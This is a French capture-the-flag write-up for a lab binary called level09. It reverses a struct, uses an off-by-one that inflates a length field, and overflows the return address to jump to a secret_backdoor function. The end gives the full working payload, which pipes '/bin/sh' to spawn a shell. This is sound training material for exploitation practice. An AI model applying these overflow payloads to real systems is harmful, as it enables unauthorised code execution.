En observant le binaire avec Ghidra, on trouve une fonction secret_backdoor qui permet de lancer un shell admin. On suppose qu'il va falloir utiliser un overflow pour faire pointer sur l'adresse de cette fonction.

Il y a une structure qui est utilisée pour générer un message, remarquable par ce bout d'ASM car il y a beaucoup d'assignations a partir d'un même pointeur, dans un pattern qui est trop "spécifique" pour appartenir à un array (https://www.tripwire.com/state-of-security/ghidra-101-creating-structures-in-ghidra):
```
0x00000000000008cb <+11>:    lea    -0xc0(%rbp),%rax
0x00000000000008d2 <+18>:    add    $0x8c,%rax // add 140 bytes
0x00000000000008d8 <+24>:    movq   $0x0,(%rax)
0x00000000000008df <+31>:    movq   $0x0,0x8(%rax)
0x00000000000008e7 <+39>:    movq   $0x0,0x10(%rax)
0x00000000000008ef <+47>:    movq   $0x0,0x18(%rax)
0x00000000000008f7 <+55>:    movq   $0x0,0x20(%rax) // then set next 40 bytes to 0, 8 by 8 up to 0x28 (40)
0x00000000000008ff <+63>:    movl   $0x8c,-0xc(%rbp) // then use movl to set 4 bytes at once to the value 140, probably an int
0x0000000000000906 <+70>:    lea    -0xc0(%rbp),%rax
```

Elle équivaut à
```
typedef struct message
{
    char text[140];
    char username[40];
    int len;
} message;
```

On remarque que setusername copie 41 caractères dans username (qui possède un buffer de 40). Avec cet overflow de 1, on peut changer l'int de la structure qui est juste après, qui impacte le nombre de caractères qui sont strncpy dans setmessage. Le buffer d'arrivée fait 140, on peut set le nombre de caractères à 255 max en overridant avec le caractère \xff, ce qui nous permet de faire un autre overflow et override l'adresse de retour.

Comme on est en architecture x64, l'adresse de retour se trouve juste au-dessus de RSP (schéma descriptif https://2603957456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MaTeRvboVjnErSpM-5Q%2F-MaThwaoo5UffZzrO0Jl%2Fimage.png). On peut donc lancer le programme avec un pattern, puis examiner RSP :

```
python -c "print 'A' * 40 + '\xff' + '\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4'" > /tmp/lol

gdb level09
(gdb) r < /tmp/lol
(gdb) x/20a $rsp
0x7fffffffe5c8: 0x4138674137674136      0x3168413068413967
0x7fffffffe5d8: 0x6841336841326841      0x4136684135684134
0x7fffffffe5e8: 0x3968413868413768      0x6941316941306941
0x7fffffffe5f8: 0x34694133694132        0x0
0x7fffffffe608: 0x581153f94fd03761      0x555555554790 <_start>
[...]
```
Le pattern match à 208, donc l'offset est à 200, c'est là qu'il faut que l'adresse de secret_backdoor soit placée

```
(gdb) info functions backdoor
All functions matching regular expression "backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor
\x8c\x48\x55\x55\x55\x55\x00\x00
```
On oublie pas de rajouter /bin/sh juste à la fin comme secret_backdoor lance `system` avec l'input de l'utilisateur

`(python -c "print 'A' * 40 + '\xff' + '\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '/bin/sh'"; cat ) | ./level09`

On peut cat le flag de end